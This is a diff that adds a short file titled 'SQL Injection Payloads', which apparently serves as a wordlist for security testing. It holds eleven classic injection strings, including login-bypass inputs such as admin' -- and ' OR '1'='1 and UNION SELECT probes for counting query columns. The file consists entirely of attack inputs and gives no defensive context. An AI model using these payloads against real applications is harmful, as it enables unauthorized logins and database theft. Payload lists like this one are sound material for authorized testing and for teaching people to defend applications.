@@ -1,0 +1,12 @@
+# SQL Injection Payloads
+' OR '1'='1
+' OR 1=1 --
+' OR 1=1 /*
+admin' --
+admin' #
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+admin' OR '1'='1
+' AND 1=0 UNION SELECT NULL --
+' AND 1=0 UNION SELECT NULL, NULL --
